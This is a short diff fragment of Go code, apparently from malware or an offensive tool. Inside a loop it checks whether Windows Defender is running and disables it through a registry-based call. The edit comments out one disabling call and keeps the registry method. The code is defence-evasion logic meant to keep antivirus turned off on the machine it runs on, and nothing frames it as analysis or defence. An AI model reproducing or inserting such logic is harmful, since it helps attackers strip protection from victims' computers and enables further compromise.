@@ -161,7 +161,7 @@ func Start() {
 	for {
 
 		if IsDefenderRunning() {
-			DisableDefender(true)
+			//DisableDefender(true)
 			native.DisableDefenderWithRegistry(true)			
 		}
 
